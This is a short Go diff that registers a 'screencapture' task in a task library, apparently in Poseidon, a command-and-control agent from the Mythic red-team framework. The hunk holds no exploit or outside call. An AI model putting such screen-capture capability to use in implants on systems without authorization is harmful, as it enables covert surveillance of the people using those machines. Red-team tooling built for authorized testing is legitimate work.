@@ -8,7 +8,12 @@ import (
 	"strconv"
 
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/tasks/library"
 )
+
+func init() {
+	library.RegisterTask("screencapture", Run)
+}
 
 // ScreenShot - interface for holding screenshot data
 type ScreenShot interface {
